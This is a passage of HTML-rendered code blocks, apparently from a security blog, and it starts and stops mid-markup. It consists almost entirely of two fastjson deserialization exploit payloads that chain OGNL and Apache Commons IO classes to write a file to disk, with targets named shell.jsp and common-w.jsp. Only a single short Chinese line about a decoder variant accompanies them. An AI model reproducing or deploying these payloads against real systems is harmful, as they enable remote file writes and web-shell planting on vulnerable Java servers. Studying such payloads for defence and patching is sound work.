class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.OgnlException&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.OgnlException&quot;,</span><br><span class="line">                &quot;_evaluation&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;z&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                &quot;p&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                    &quot;stream&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                        &quot;delegate&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                            &quot;reader&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                &quot;is&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                    &quot;input&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                        &quot;reader&quot;: &#123;</span><br><span class="line">                                            &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,</span><br><span class="line">                                            &quot;charSequence&quot;: &#123;</span><br><span class="line">                                                &quot;@type&quot;: &quot;java.lang.String&quot;&quot;something&gt;8192&quot;</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                            &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                            &quot;bufferSize&quot;: 1024</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,</span><br><span class="line">                                            &quot;writer&quot;: &#123;</span><br><span class="line">                                                &quot;@type&quot;: &quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,</span><br><span class="line">                                                &quot;file&quot;: &quot;D:/tmp/shell.jsp&quot;,</span><br><span class="line">                                                &quot;encoding&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                                &quot;append&quot;: false</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                            &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                            &quot;bufferSize&quot;: 1024,</span><br><span class="line">                                            &quot;writeImmediately&quot;: true</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;u&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;v&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;w&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>WriteOutputStream</code>使用包含<code>decoder</code>的构造方法</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.OgnlException&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.OgnlException&quot;,</span><br><span class="line">                &quot;_evaluation&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;z&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                &quot;p&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                    &quot;stream&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                        &quot;delegate&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                            &quot;reader&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                &quot;is&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                    &quot;input&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                        &quot;reader&quot;: &#123;</span><br><span class="line">                                            &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,</span><br><span class="line">                                            &quot;charSequence&quot;: &#123;</span><br><span class="line">                                                &quot;@type&quot;: &quot;java.lang.String&quot;&quot;something &gt; 8192&quot;</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                            &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                            &quot;bufferSize&quot;: 1024</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,</span><br><span class="line">                                            &quot;writer&quot;: &#123;</span><br><span class="line">                                                &quot;@type&quot;: &quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,</span><br><span class="line">                                                &quot;file&quot;: &quot;/tmp/common-w.jsp&quot;,</span><br><span class="line">                                                &quot;encoding&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                                &quot;append&quot;: false</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                            &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                            &quot;bufferSize&quot;: 1024,</span><br><span class="line">                                            &quot;writeImmediately&quot;: true</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;decoder&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;com.alibaba.fastjson.util.UTF8Decoder&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;u&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;v&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span 